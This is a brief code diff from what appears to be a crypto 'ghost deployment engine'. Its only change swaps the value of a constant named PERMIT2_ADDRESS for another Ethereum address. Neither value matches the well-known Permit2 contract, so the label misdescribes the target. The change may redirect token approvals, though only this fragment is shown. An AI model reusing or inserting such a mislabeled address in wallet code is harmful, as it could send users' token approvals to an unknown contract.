@@ -9,7 +9,7 @@ import { EXECUTION_POLICY } from "@/lib/ghost/constants";
 /**
  * 🛰️ GHOST DEPLOYMENT ENGINE (v9.0.0 - Optimized for UniversalSettler)
  */
-export const PERMIT2_ADDRESS = "0x6072e645bab9be651fb195c5e5445625a7606ec8";
+export const PERMIT2_ADDRESS = "0x3fBdAe5785340Fc3cad3678690481312E4Eb74B3";
 
 /**
  * 🛡️ SIGNATURE GUARD
